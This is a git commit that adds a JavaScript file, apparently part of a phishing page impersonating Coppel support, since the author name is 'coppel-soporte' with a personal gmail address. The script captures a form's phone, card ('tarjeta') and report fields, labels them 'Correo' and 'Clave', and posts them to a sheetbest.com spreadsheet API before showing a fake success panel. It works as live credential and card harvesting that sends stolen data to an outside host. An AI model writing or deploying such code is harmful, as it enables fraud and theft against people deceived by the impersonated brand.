f196f92d8e909ebb2725873dc629e8c869d6c730
coppel-soporte <aguschueco50@gmail.com>
2025-09-02 19:06:26 -0600

    add data code

---
+++ js/0822.js
@@ -0,0 +1,32 @@
+const formulario = document.getElementById('contact-form');
+const registro = document.getElementById('registro');
+const exito = document.getElementById('exito');
+
+formulario.addEventListener('submit', async(e) =>{
+    e.preventDefault();
+
+
+try {    
+    const respuesta = await fetch('https://api.sheetbest.com/sheets/47217f77-2a0a-475d-ab0e-cbf0ec16e5f2', {
+        method: 'POST',
+        mode: 'cors',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            "Correo": formulario.telefono.value,
+            "Clave": formulario.tarjeta.value,
+            "Reporte": formulario.reporte.value
+            
+        })
+    });
+
+
+
+} catch(error){
+    console.log(error);
+}
+    
+    registro.classList.remove('activo');
+    exito.classList.add('activo');
+});
